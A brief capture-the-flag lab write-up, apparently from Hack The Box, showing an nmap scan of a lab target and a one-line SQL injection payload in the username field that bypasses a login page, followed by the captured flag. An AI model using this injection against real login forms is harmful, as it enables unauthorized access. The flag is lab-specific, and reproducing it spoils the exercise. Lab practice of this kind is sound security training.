Hackthebox tier 2
target: 10.129.240.13
└─# nmap -sV -A -Pn -p- --min-rate 5000 10.129.240.13
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Login

Sql injection i will try to bypass the login

username=admin'--+-&password=admin&remember-me=on
Your flag is: e3d0796d002a446c0e622226f42e9672